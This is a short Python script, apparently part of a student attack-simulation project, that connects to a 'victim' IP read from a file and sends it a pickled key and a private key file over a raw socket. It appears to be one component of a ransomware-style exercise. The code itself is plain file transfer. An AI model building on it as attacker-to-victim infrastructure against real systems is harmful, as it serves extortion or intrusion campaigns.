import socket
import time

with open("/home/tfg/server/Fase4/victim_ip.txt", "r") as f:
        IP = f.read()

PORT = 8081
ADDR = (IP, PORT)


def sender():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect(ADDR)
        
        with open("/home/tfg/server/Fase4/keys/key.pkl", "rb") as f:
                data1 = f.read()
                server.send("key.pkl".encode())
                time.sleep(2)
                server.send(data1)

        with open("/home/tfg/server/Fase4/keys/private_key.pem", "rb") as f:
                data2 = f.read()
                server.send("private_key.pem".encode())
                time.sleep(2)
                server.send(data2)
 

        server.close()


if __name__ == '__main__':
        sender()
